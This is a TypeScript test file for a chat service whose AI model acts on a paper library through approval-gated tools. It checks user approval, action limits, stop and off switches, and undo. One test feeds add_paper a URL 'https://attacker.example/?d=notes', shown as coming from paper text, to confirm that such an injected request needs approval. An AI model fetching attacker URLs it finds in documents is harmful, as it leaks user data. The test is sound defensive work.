import { describe, expect, it, vi } from 'vitest'
import type { ActionExecutor } from '../../../src/main/chats/actionTypes'
import { ACTION_TOOL_TIMEOUT_MS } from '../../../src/main/chats/ChatService'
import { LlmError, type ChatRequest } from '../../../src/main/llm/LlmProvider'
import { RunClock } from '../../../src/main/llm/RunClock'
import { ToolError } from '../../../src/main/mcp/libraryTools'
import type { ActionView } from '../../../src/shared/chat'
import { TOOL_RISK } from '../../../src/shared/chatActions'
import { setupChats, waitFor } from '../../helpers/chats'
import { chatAnswer } from '../../helpers/llm'
import { callTools, listTools, type ToolCall, type ToolOutcome } from '../../helpers/mcp'
import { DRAIN_ID } from '../../helpers/pair'

const ask = (text: string, chatId: string | null = null) => ({ chatId, scope: 'library' as const, model: 'sonnet' as const, text, excerpt: null })
const actionsOf = (req: ChatRequest) => req.servers.find((s) => s.name === 'actions')!
const thrown = (fn: () => void): unknown => {
  try {
    fn()
  } catch (error) {
    return error
  }
  return null
}
const note = (text: string, quote = 'add a note to Drain'): ToolCall => ({ name: 'write_note', arguments: { paper_id: DRAIN_ID, text, request_quote: quote } })
/** Each call on its own client, all at once, as a model calling tools in parallel does. */
const inParallel = async (endpoint: { url: string; token: string }, calls: ToolCall[]): Promise<ToolOutcome[]> =>
  (await Promise.all(calls.map((c) => callTools(endpoint, [c])))).flat()

/** Prepares any call as asked (delete_forever is refused before asking) and records what ran and what was undone. */
function fakeActions() {
  const ran: string[] = []
  const entered: string[] = []
  let latch: Promise<void> | null = null
  /** The next prepares wait until the returned release is called. */
  const hold = (): (() => void) => {
    let release!: () => void
    latch = new Promise((r) => (release = r))
    return release
  }
  const executor: ActionExecutor = {
    read: async (tool) => ({ read: tool }),
    prepare: async (tool, args) => {
      entered.push(tool)
      if (latch) await latch
      if (tool === 'delete_forever') throw new ToolError('None of these papers is in the trash.')
      return {
        tool,
        args: Object.fromEntries(Object.entries(args).filter(([k]) => k !== 'request_quote')),
        preview: { papers: [{ id: DRAIN_ID, title: 'Drain' }], cost: null },
        risk: TOOL_RISK[tool],
        pickPdf: tool === 'attach_pdf',
        execute: async ({ pdfPath, identifier }) => {
          const extra = pdfPath ?? identifier
          ran.push(extra ? `${tool} ${extra}` : tool)
          return { result: { ok: 1 }, undo: async () => void ran.push(`undo ${tool}`) }
        }
      }
    }
  }
  return { executor, ran, entered, hold }
}

describe('ChatService actions', () => {
  it("offers the actions server only to a conversation whose switch is on, with that switch's tools", async () => {
    const { executor } = fakeActions()
    let tools: string[] = []
    const { chats, provider } = await setupChats({
      actions: executor,
      responses: [
        chatAnswer('ok'),
        async (req) => {
          tools = (await listTools(actionsOf(req))).map((t) => t.name)
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send(ask('Hi'))
    await chats.idle()
    expect(provider.chatCalls[0].servers.map((s) => s.name)).toEqual(['library'])
    expect(provider.chatCalls[0]).toMatchObject({ maxTurns: 15 })
    expect(provider.chatCalls[0].toolTimeoutMs).toBeUndefined()
    expect(provider.chatCalls[0].system).not.toContain('request_quote')
    await chats.setTools(id, { actions: true })
    expect((await chats.open(id)).summary).toMatchObject({ actions: true, sync: false })
    await chats.send(ask('Again', id))
    await chats.idle()
    const req = provider.chatCalls[1]
    expect(req.servers.map((s) => s.name)).toEqual(['library', 'actions'])
    expect(req).toMatchObject({ maxTurns: 35, toolTimeoutMs: ACTION_TOOL_TIMEOUT_MS })
    expect(req.clock).toBeInstanceOf(RunClock)
    expect(req.system).toContain('request_quote')
    // The prompt names only what the switches offer.
    expect(req.system).not.toContain('syncing with git')
    expect(tools).toContain('write_note')
    expect(tools).not.toContain('sync_now')
  })

  it('never starts an actions server without the session giving actions, whatever the switches say', async () => {
    const { chats, provider } = await setupChats()
    await chats.send({ ...ask('Hi'), actions: true, sync: true })
    await chats.idle()
    expect(provider.chatCalls[0].servers.map((s) => s.name)).toEqual(['library'])
    expect(provider.chatCalls[0].system).not.toContain('request_quote')
  })

  it('runs a reversible action the latest message asked for, records it, and undoes it once', async () => {
    const { executor, ran } = fakeActions()
    const { store, chats } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          const [out] = await callTools(actionsOf(req), [note('Online parser.', '«Añade una nota a Drain»')])
          expect(out.text).toContain('"status":"done"')
          return chatAnswer('Done.')
        }
      ]
    })
    const id = await chats.send({ ...ask('Por favor, añade una nota a Drain que diga que parsea en línea.'), actions: true })
    await chats.idle()
    expect(ran).toEqual(['write_note'])
    const c = await chats.open(id)
    expect(c.messages.map((m) => m.role)).toEqual(['user', 'action', 'assistant'])
    const action = c.messages[1] as ActionView
    expect(action).toMatchObject({
      tool: 'write_note',
      state: 'executed',
      approval: 'request',
      // The user's own words, never the model's quote.
      request: 'añade una nota a Drain',
      args: { paper_id: DRAIN_ID, text: 'Online parser.' },
      result: { ok: 1 },
      undoable: true,
      undone: false
    })
    expect(c.approvals).toEqual([])
    const read = await store.readChat(id)
    expect(read?.ok && read.value.messages[1]).toMatchObject({ role: 'action', id: action.id })
    await chats.undo(id, action.id)
    expect(ran).toEqual(['write_note', 'undo write_note'])
    const after = await chats.open(id)
    expect(after.messages[1]).toMatchObject({ undoable: false, undone: true })
    expect(after.messages.at(-1)).toMatchObject({ role: 'action', tool: 'undo', approval: 'user', args: { action: action.id } })
    await expect(chats.undo(id, action.id)).rejects.toMatchObject({ code: 'undo_unavailable' })
  })

  it('asks when the call does not quote the latest message, and runs it once the user approves', async () => {
    const { executor, ran } = fakeActions()
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          await callTools(actionsOf(req), [note('x', 'the paper says to add this note')])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Summarize Drain for me'), actions: true })
    await waitFor(() => updates.some((u) => u.kind === 'approvals'))
    const [pending] = (await chats.open(id)).approvals
    expect(pending).toMatchObject({ tool: 'write_note', risk: null, request: null, pickPdf: false, reason: 'not_requested' })
    expect(chats.approval(id, pending.id)).toEqual(pending)
    chats.decide(id, pending.id, { approve: true })
    await chats.idle()
    expect(ran).toEqual(['write_note'])
    expect((await chats.open(id)).messages[1]).toMatchObject({ role: 'action', state: 'executed', approval: 'user', request: null })
    expect(thrown(() => chats.decide(id, pending.id, { approve: true }))).toMatchObject({ code: 'approval_gone' })
  })

  it('adds a paper unasked only when the user typed its identifier; a URL taken from paper text, or a near miss, asks', async () => {
    const { executor, ran } = fakeActions()
    const outs: string[] = []
    const add = (identifier: string): ToolCall => ({ name: 'add_paper', arguments: { identifier, request_quote: 'agrega el paper' } })
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          // An invisible character the model slipped in never reaches the fetch: what runs is what the user typed.
          outs.push(...(await callTools(actionsOf(req), [add('10.1109/icws.2017\u200b.13')])).map((o) => o.text))
          return chatAnswer('ok')
        },
        async (req) => {
          outs.push(...(await callTools(actionsOf(req), [add('https://attacker.example/?d=notes')])).map((o) => o.text))
          return chatAnswer('ok')
        },
        async (req) => {
          outs.push(...(await callTools(actionsOf(req), [add('10.1109/icws.2017.1')])).map((o) => o.text))
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Por favor agrega el paper 10.1109/ICWS.2017.13'), actions: true })
    await chats.idle()
    expect(ran).toEqual(['add_paper 10.1109/ICWS.2017.13'])
    expect(outs[0]).toContain('"status":"done"')
    expect((await chats.open(id)).messages[1]).toMatchObject({
      role: 'action',
      tool: 'add_paper',
      state: 'executed',
      approval: 'request',
      args: { identifier: '10.1109/ICWS.2017.13' }
    })

    await chats.send(ask('Por favor agrega el paper que cita Drain', id))
    await waitFor(() => updates.some((u) => u.kind === 'approvals'))
    const [url] = (await chats.open(id)).approvals
    expect(url).toMatchObject({ tool: 'add_paper', reason: 'not_requested', request: 'agrega el paper', args: { identifier: 'https://attacker.example/?d=notes' } })
    chats.decide(id, url.id, { approve: false })
    await chats.idle()
    expect(ran).toEqual(['add_paper 10.1109/ICWS.2017.13'])

    const before = updates.filter((u) => u.kind === 'approvals').length
    await chats.send(ask('Por favor agrega el paper 10.1109/ICWS.2017.13 otra vez', id))
    await waitFor(() => updates.filter((u) => u.kind === 'approvals').length > before)
    const [near] = (await chats.open(id)).approvals
    expect(near).toMatchObject({ tool: 'add_paper', reason: 'not_requested', args: { identifier: '10.1109/icws.2017.1' } })
    chats.decide(id, near.id, { approve: false })
    await chats.idle()
    expect(ran).toEqual(['add_paper 10.1109/ICWS.2017.13'])
  })

  it('always asks before what removes, even when asked for; a denial is recorded and told to Claude', async () => {
    const { executor, ran } = fakeActions()
    let told = ''
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          const [out] = await callTools(actionsOf(req), [{ name: 'trash_papers', arguments: { paper_ids: [DRAIN_ID], request_quote: 'quita Drain de la biblioteca' } }])
          told = out.text
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Por favor, quita Drain de la biblioteca.'), actions: true })
    await waitFor(() => updates.some((u) => u.kind === 'approvals'))
    const [pending] = (await chats.open(id)).approvals
    expect(pending).toMatchObject({ tool: 'trash_papers', risk: 'removes', reason: 'risk', request: 'quita Drain de la biblioteca', preview: { papers: [{ id: DRAIN_ID }] } })
    chats.decide(id, pending.id, { approve: false })
    await chats.idle()
    expect(ran).toEqual([])
    expect(told).toContain('"status":"denied"')
    expect(told).toContain('Do not try it again')
    expect((await chats.open(id)).messages[1]).toMatchObject({ role: 'action', tool: 'trash_papers', state: 'denied', approval: null, result: { reason: 'user' }, undoable: false })
  })

  it('always asks before editing a summary, even when the latest message asked for it in those words', async () => {
    const { executor, ran } = fakeActions()
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          await callTools(actionsOf(req), [
            { name: 'edit_summary', arguments: { paper_id: DRAIN_ID, section: 'fields', key: 'tldr', value: 'An online parser.', request_quote: 'change the tldr of Drain' } }
          ])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Please change the tldr of Drain to «An online parser».'), actions: true })
    await waitFor(() => updates.some((u) => u.kind === 'approvals'))
    expect((await chats.open(id)).approvals).toMatchObject([{ tool: 'edit_summary', risk: 'edits', reason: 'risk', request: 'change the tldr of Drain' }])
    expect(ran).toEqual([])
    await chats.close()
    expect((await chats.open(id)).messages[1]).toMatchObject({ role: 'action', tool: 'edit_summary', state: 'denied', result: { reason: 'stopped' } })
  })

  it('runs at most three actions unasked per message, even when Claude calls them all at once', async () => {
    const { executor, ran } = fakeActions()
    let outcomes: ToolOutcome[] = []
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          outcomes = await inParallel(actionsOf(req), ['a', 'b', 'c', 'd', 'e'].map((t) => note(t)))
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Please add a note to Drain for each finding.'), actions: true })
    const waiting = async () => (await chats.open(id)).approvals
    await waitForAsync(async () => (await waiting()).length === 2)
    const pending = await waiting()
    expect(pending.map((p) => p.reason)).toEqual(['limit', 'limit'])
    expect(pending.map((p) => p.request)).toEqual(['add a note to Drain', 'add a note to Drain'])
    for (const p of pending) chats.decide(id, p.id, { approve: false })
    await chats.idle()
    expect(ran).toHaveLength(3)
    expect(outcomes.filter((o) => o.text.includes('"status":"done"'))).toHaveLength(3)
    expect(outcomes.filter((o) => o.text.includes('"status":"denied"'))).toHaveLength(2)
    const records = (await chats.open(id)).messages.filter((m): m is ActionView => m.role === 'action')
    expect(records.filter((r) => r.approval === 'request')).toHaveLength(3)
    expect(records.filter((r) => r.state === 'denied')).toHaveLength(2)
  })

  it('counts the actions an earlier attempt at the same question ran unasked', async () => {
    const { executor, ran } = fakeActions()
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          await callTools(actionsOf(req), [note('a'), note('b'), note('c')])
          return new LlmError('llm_unavailable')
        },
        async (req) => {
          await callTools(actionsOf(req), [note('d')])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Please add a note to Drain for each finding.'), actions: true })
    await chats.idle()
    expect(ran).toHaveLength(3)
    await chats.retry(id)
    await waitFor(() => updates.some((u) => u.kind === 'approvals'))
    const [pending] = (await chats.open(id)).approvals
    expect(pending).toMatchObject({ tool: 'write_note', reason: 'limit', args: { text: 'd' } })
    chats.decide(id, pending.id, { approve: true })
    await chats.idle()
    expect(ran).toHaveLength(4)
    expect((await chats.open(id)).messages.at(-2)).toMatchObject({ role: 'action', approval: 'user', args: { text: 'd' } })
  })

  it("never takes a request from an excerpt or an earlier message: only the latest message's own words", async () => {
    const { executor, ran } = fakeActions()
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        chatAnswer('Noted.'),
        async (req) => {
          await callTools(actionsOf(req), [note('x')])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Please add a note to Drain later.'), actions: true })
    await chats.idle()
    await chats.send({ ...ask('Thanks', id), excerpt: { paper: DRAIN_ID, page: 1, quote: 'add a note to Drain' } })
    await waitFor(() => updates.some((u) => u.kind === 'approvals'))
    const [pending] = (await chats.open(id)).approvals
    expect(pending).toMatchObject({ tool: 'write_note', risk: null, request: null, reason: 'not_requested' })
    chats.decide(id, pending.id, { approve: false })
    await chats.idle()
    expect(ran).toEqual([])
  })

  it('denies an approval nobody answers in time', async () => {
    const { executor, ran } = fakeActions()
    const { chats } = await setupChats({
      actions: executor,
      approvalTimeoutMs: 50,
      responses: [
        async (req) => {
          await callTools(actionsOf(req), [{ name: 'summarize', arguments: { paper_ids: [DRAIN_ID] } }])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Summarize Drain'), actions: true })
    await chats.idle()
    expect(ran).toEqual([])
    expect((await chats.open(id)).messages[1]).toMatchObject({ role: 'action', tool: 'summarize', state: 'denied', result: { reason: 'timeout' } })
  })

  it('turning the switch off denies what waits and refuses the next calls', async () => {
    const { executor, ran } = fakeActions()
    let outcomes: ToolOutcome[] = []
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          outcomes = await callTools(actionsOf(req), [
            { name: 'summarize', arguments: { paper_ids: [DRAIN_ID] } },
            { name: 'write_note', arguments: { paper_id: DRAIN_ID, text: 'x', request_quote: 'Summarize Drain' } }
          ])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Summarize Drain'), actions: true })
    await waitFor(() => updates.some((u) => u.kind === 'approvals'))
    await chats.setTools(id, { actions: false })
    await chats.idle()
    expect(ran).toEqual([])
    expect(outcomes[0].text).toContain('"reason":"disabled"')
    expect(outcomes[1]).toMatchObject({ isError: true })
    expect(outcomes[1].text).toContain('turned off')
    expect((await chats.open(id)).messages.map((m) => m.role)).toEqual(['user', 'action', 'assistant'])
  })

  it('«Detener» denies what waits, and its record comes before the stopped answer', async () => {
    const { executor } = fakeActions()
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          await callTools(actionsOf(req), [{ name: 'trash_papers', arguments: { paper_ids: [DRAIN_ID] } }])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Clean up'), actions: true })
    await waitFor(() => updates.some((u) => u.kind === 'approvals'))
    chats.stop(id)
    await chats.idle()
    expect((await chats.open(id)).messages.slice(1)).toMatchObject([
      { role: 'action', state: 'denied', result: { reason: 'stopped' } },
      { role: 'assistant', stopped: true }
    ])
  })

  it('reads freely without records, passes on the PDF the user picked, and tells Claude what cannot be done', async () => {
    const { executor, ran } = fakeActions()
    let results: ToolOutcome[] = []
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          results = await callTools(actionsOf(req), [
            { name: 'list_trash', arguments: {} },
            { name: 'sync_status', arguments: {} },
            { name: 'delete_forever', arguments: { paper_ids: [DRAIN_ID] } },
            { name: 'attach_pdf', arguments: { paper_id: DRAIN_ID } }
          ])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Attach the PDF of Drain'), actions: true, sync: true })
    await waitFor(() => updates.some((u) => u.kind === 'approvals'))
    const [pending] = (await chats.open(id)).approvals
    expect(pending).toMatchObject({ tool: 'attach_pdf', pickPdf: true, risk: 'file' })
    expect(thrown(() => chats.decide(id, pending.id, { approve: true }))).toMatchObject({ code: 'invalid_edit' })
    chats.decide(id, pending.id, { approve: true, pdfPath: '/home/me/drain.pdf' })
    await chats.idle()
    expect(results.map((r) => r.isError)).toEqual([false, false, true, false])
    expect(results[0].text).toContain('"read":"list_trash"')
    expect(results[2].text).toBe('None of these papers is in the trash.')
    expect(ran).toEqual(['attach_pdf /home/me/drain.pdf'])
    const messages = (await chats.open(id)).messages
    expect(messages.map((m) => (m.role === 'action' ? m.tool : m.role))).toEqual(['user', 'attach_pdf', 'assistant'])
    expect(JSON.stringify(messages[1])).not.toContain('/home/me')
  })

  it('a question retried after its actions keeps them and tells Claude they already ran', async () => {
    const { executor, ran } = fakeActions()
    const { chats, provider } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          await callTools(actionsOf(req), [note('Parses online.')])
          return new LlmError('llm_unavailable')
        },
        chatAnswer('Done before.')
      ]
    })
    const id = await chats.send({ ...ask('Please add a note to Drain.'), actions: true })
    await chats.idle()
    expect(await chats.open(id)).toMatchObject({ canRetry: true, messages: [{ role: 'user' }, { role: 'action', state: 'executed' }] })
    await chats.retry(id)
    await chats.idle()
    const input = provider.chatCalls[1].input
    expect(input).toContain('<actions_done>\nwrite_note executed {"paper_id":"he2017drain","text":"Parses online."} -> {"ok":1}\n</actions_done>')
    // Only in <actions_done>, not in the history too.
    expect(input).not.toContain('<conversation>')
    expect(input.split('write_note executed')).toHaveLength(2)
    expect((await chats.open(id)).messages.map((m) => m.role)).toEqual(['user', 'action', 'assistant'])
    expect(ran).toEqual(['write_note'])
  })

  it('«Detener» while a call is being prepared: it never runs and never asks', async () => {
    const { executor, ran, entered, hold } = fakeActions()
    const release = hold()
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          await callTools(actionsOf(req), [note('x')])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Please add a note to Drain.'), actions: true })
    await waitFor(() => entered.length === 1)
    chats.stop(id)
    release()
    await chats.idle()
    expect(ran).toEqual([])
    expect(updates.some((u) => u.kind === 'approvals')).toBe(false)
    const c = await chats.open(id)
    expect(c.approvals).toEqual([])
    expect(c.messages.slice(1)).toMatchObject([
      { role: 'action', tool: 'write_note', state: 'denied', approval: null, result: { reason: 'stopped' } },
      { role: 'assistant', stopped: true }
    ])
  })

  it('a switch turned off while a call is being prepared: it never runs and Claude is told', async () => {
    const { executor, ran, entered, hold } = fakeActions()
    const release = hold()
    let told = ''
    const { chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          ;[{ text: told }] = await callTools(actionsOf(req), [note('x')])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Please add a note to Drain.'), actions: true })
    await waitFor(() => entered.length === 1)
    await chats.setTools(id, { actions: false })
    release()
    await chats.idle()
    expect(ran).toEqual([])
    expect(told).toContain('"reason":"disabled"')
    expect(updates.some((u) => u.kind === 'approvals')).toBe(false)
    expect((await chats.open(id)).messages.slice(1)).toMatchObject([
      { role: 'action', state: 'denied', result: { reason: 'disabled' } },
      { role: 'assistant', stopped: false }
    ])
  })

  it('an answer that fails while a call is being prepared leaves no approval waiting and the conversation free', async () => {
    const { executor, ran, entered, hold } = fakeActions()
    const release = hold()
    const { chats, updates } = await setupChats({
      actions: executor,
      approvalTimeoutMs: 5000,
      responses: [
        async (req) => {
          void callTools(actionsOf(req), [{ name: 'trash_papers', arguments: { paper_ids: [DRAIN_ID] } }]).catch(() => undefined)
          await waitFor(() => entered.length === 1)
          setTimeout(release, 30)
          return new LlmError('llm_unavailable')
        }
      ]
    })
    const id = await chats.send({ ...ask('Clean up'), actions: true })
    const started = Date.now()
    await chats.idle()
    expect(Date.now() - started).toBeLessThan(2000)
    expect(ran).toEqual([])
    expect(updates.some((u) => u.kind === 'approvals')).toBe(false)
    const c = await chats.open(id)
    expect(c).toMatchObject({ canRetry: true, approvals: [] })
    expect(c.messages.slice(1)).toMatchObject([{ role: 'action', tool: 'trash_papers', state: 'denied', result: { reason: 'stopped' } }])
  })

  it('an approval granted after the switch was turned off elsewhere (a sync) does not run', async () => {
    const { executor, ran } = fakeActions()
    const { store, chats, updates } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          await callTools(actionsOf(req), [note('x', 'the paper says to add this note')])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Summarize Drain for me'), actions: true })
    await waitFor(() => updates.some((u) => u.kind === 'approvals'))
    const read = await store.readChat(id)
    if (!read?.ok) throw new Error('unreadable')
    await store.writeChat({ ...read.value, meta: { ...read.value.meta, actions: false } }, read.hash)
    const [pending] = (await chats.open(id)).approvals
    chats.decide(id, pending.id, { approve: true })
    await chats.idle()
    expect(ran).toEqual([])
    expect((await chats.open(id)).messages[1]).toMatchObject({ role: 'action', state: 'denied', approval: null, result: { reason: 'disabled' } })
  })

  it('an undo whose record fails to write once is still recorded', async () => {
    const { executor, ran } = fakeActions()
    const { store, chats } = await setupChats({
      actions: executor,
      responses: [
        async (req) => {
          await callTools(actionsOf(req), [note('x')])
          return chatAnswer('ok')
        }
      ]
    })
    const id = await chats.send({ ...ask('Please add a note to Drain.'), actions: true })
    await chats.idle()
    const action = (await chats.open(id)).messages[1] as ActionView
    vi.spyOn(store, 'writeChat').mockRejectedValueOnce(new Error('disk full'))
    await chats.undo(id, action.id)
    expect(ran).toEqual(['write_note', 'undo write_note'])
    expect((await chats.open(id)).messages.at(-1)).toMatchObject({ role: 'action', tool: 'undo', args: { action: action.id } })
  })

  it('an executed action whose record fails to write once is still recorded, with its undo', async () => {
    const { executor, ran } = fakeActions()
    let failNextWrite = (): void => {}
    const wrapped: ActionExecutor = {
      read: executor.read,
      prepare: async (tool, args) => {
        const p = await executor.prepare(tool, args)
        return {
          ...p,
          execute: async (opts) => {
            const done = await p.execute(opts)
            failNextWrite()
            return done
          }
        }
      }
    }
    const { store, chats } = await setupChats({
      actions: wrapped,
      responses: [
        async (req) => {
          await callTools(actionsOf(req), [note('x')])
          return chatAnswer('ok')
        }
      ]
    })
    failNextWrite = () => void vi.spyOn(store, 'writeChat').mockRejectedValueOnce(new Error('disk full'))
    const id = await chats.send({ ...ask('Please add a note to Drain.'), actions: true })
    await chats.idle()
    expect(ran).toEqual(['write_note'])
    const action = (await chats.open(id)).messages[1] as ActionView
    expect(action).toMatchObject({ role: 'action', tool: 'write_note', state: 'executed', undoable: true })
  })
})

async function waitForAsync(check: () => Promise<boolean>, ms = 3000): Promise<void> {
  const start = Date.now()
  while (!(await check())) {
    if (Date.now() - start > ms) throw new Error('timed out')
    await new Promise((r) => setTimeout(r, 10))
  }
}
